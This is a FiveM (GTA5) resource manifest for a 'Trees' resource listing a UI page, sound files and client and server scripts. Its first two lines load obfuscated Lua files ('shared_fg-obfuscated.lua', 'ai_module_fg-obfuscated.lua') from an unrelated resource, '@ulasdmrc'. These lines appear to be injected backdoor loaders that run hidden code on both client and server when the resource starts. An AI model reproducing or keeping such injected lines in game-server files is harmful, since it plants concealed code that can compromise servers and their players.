shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'
fx_version 'bodacious'
game 'gta5'

author 'LDN'
description 'Trees'
version '1.0.0'

ui_page('html/index.html')

files({
    'html/index.html',
	'html/sounds/On.ogg',
	'html/sounds/Upgrade.ogg',
	'html/sounds/Off.ogg',
	'html/sounds/Downgrade.ogg'
})

client_script 'client.lua'
server_script 'server.lua'